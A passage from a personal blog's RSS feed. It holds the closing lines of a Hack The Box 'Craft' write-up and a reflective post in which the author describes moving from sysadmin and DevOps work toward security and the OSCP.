				33 root.txt
				root@craft:~#
				</code></pre><p>And we own root!!
				Again I enjoyed quite a lot doing this box a few hours it was going to be retired, and again thanks @Frundrod and <a href="https://www.hackthebox.eu/profile/103596">@Fugl</a> for pointing me in the right direction.</p>
				<p>Thanks a lot for reading, and until the next write-up.</p>
				]]>
			</content>
		</item>
		<item>
			<title>
				shutdown -r now
			</title>
			<link>
				https://pruthvirajbhat.github.io/posts/2019/12/shutdown-r-now/
			</link>
			<pubDate>
				Sun, 22 Dec 2019 00:00:00 +0000
			</pubDate>
			<guid>
				https://pruthvirajbhat.github.io/posts/2019/12/shutdown-r-now/
			</guid>
			<description>
				Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.
				I have always been thinking about writing a blog, but my mindset has always been the same &amp;ldquo;me? a blog? what am I supposed to post! I can&amp;rsquo;t even think anything I could share with people, I don&amp;rsquo;t know nothing compared to the people who blogs!&amp;rdquo;, currently that mindset has been changing.
			</description>
			<content type="html">
				<![CDATA[
				<p>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.</p>
				<p>I have always been thinking about writing a blog, but my mindset has always been the same &ldquo;me? a blog? what am I supposed to post! I can&rsquo;t even think anything I could share with people, I don&rsquo;t know nothing compared to the people
				who blogs!&rdquo;, currently that mindset has been changing. In the same way, maybe I read a really entry-level article and at some moment and it was (or is) helpful for me, it also could be helpful for another person as well things faced, the issues I ran into, etc&hellip;, and being some sort of way of escape for me itself, I think this change of mindset is the result of my last 9 months living abroad.</p>
				<p>I consider I started into IT being really old; with 18 I got my first Linux Sysadmin Job while with 9-12 years some children were playing with code, trying to break stuff, etc.
				So far in this aprox. 5 years, I meet really nice people (as also not), and make really really nice friends, and of course been learning quite a lot of stuff, but&hellip;there is something that since I started I been avoiding (Programming), and something I&rsquo;ve been looking forward to learning it but thinking I can&rsquo;t do it (Security), these two things have been chasing me for a longg longg time (at the point of making me feel a bit depressed).</p>
				<p>As I mentioned above, it&rsquo;s been around 9 months since I moved abroad (arrived in the Netherlands at ends of Apr. 2019), of this 9 months I spend 6 months in bench, without a project to work it (yes, getting my salary, but being anxious as I&rsquo;m, makes you to feel some panic when you get a paid for not doing nothing, even if you are studying), in this months I had a lot of time to think about myself, my career, what I wanted to do in the future, do I like to be a DevOps &ldquo;for all my life&rdquo; (today is devops, tomorrow who knows being as how IT works, so is just for saying it in a way), so&hellip;I started to study/practice with the book &lsquo;How to Design Programs&rsquo; (HtDP), even feeling I&rsquo;m going slow looking backwards and comparing to now, I think even if I still haven&rsquo;t finished, it indeed has been allowing me to grow.
				Now&hellip;great, but, what about security? Is still there, and I really would like to start doing stuff NOW (I&rsquo;m more a learn-by-doing person), and not wait until get all my way through a designing programs book, combined with my thoughts of &ldquo;I can&rsquo;t do Sec. without coding/I can&rsquo;t even imagine being breaking stuff without deep understanding of data-types, algorithms&rdquo;, I was getting nowhere, so I decided to try to re-program that mindset of mine, that results in me exchanging words with friends about it, talking with people who are currently into sec, and so far was an excellent idea&hellip;thanks to that now I know coding is not needed (as in mandatory) but it helps a lot to at least being able to write scripts, understand the workflow of exploits and modify them, like other things, and&hellip;that&rsquo;s something I CAN DO (and have to experience in it).</p>
				<p>Said that now my goal is to jump into the Sec. field, I started to play with boxes in HTB and reading some books, this has allowed me to set my first checkpoint: getting the OSCP cert, not for the cert itself, but more for the challenge and some compensation-ish for not having experience into sec.
				Once getting the OSCP, I will come back to the HtDP to polish my programming skills (or why not, also try to keep it in parallel?), and keep climbing (I love rock climbing/bouldering, so I could use a lot of metaphors from it!) my way up to the tops, trying to not compare me with other people, enjoying the route, and learning from all my falls; a fight between me and me.</p>
				<p>I will use this space to post walk-throughs in some HTB boxes, blog some thoughts once in a while (like this post itself), stuff in my path of also learning Dutch, etc.</p>
				<p>So far so good, keep learning and never stop doing it.</p>
				]]>
			</content>
		</item>
	</channel>
</rss>
